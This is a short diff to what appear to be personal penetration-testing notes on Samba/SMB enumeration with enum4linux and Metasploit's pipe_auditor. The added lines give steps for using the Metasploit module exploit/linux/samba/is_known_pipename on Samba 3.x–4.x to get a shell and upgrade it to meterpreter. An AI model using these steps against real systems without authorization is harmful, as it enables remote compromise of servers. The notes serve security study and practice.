@@ -20,3 +20,11 @@ enum4linux -a -u <username> -p <password> <domain/ip> //if smb doesnt have null 
 using  pipe_auditor in msf console for samba
 to get the pipes Pipes: \netlogon, \lsarpc, \samr, \eventlog, \InitShutdown, \ntsvcs, \srvsvc, \wkssvc
 
+if samba using version is 3.x-4.x then remember to use 
+exploit/linux/samba/is_known_pipename
+set rhost
+>check //it checks vulnerable or not then
+run you get shell 
+convert to metrpreter
+
+
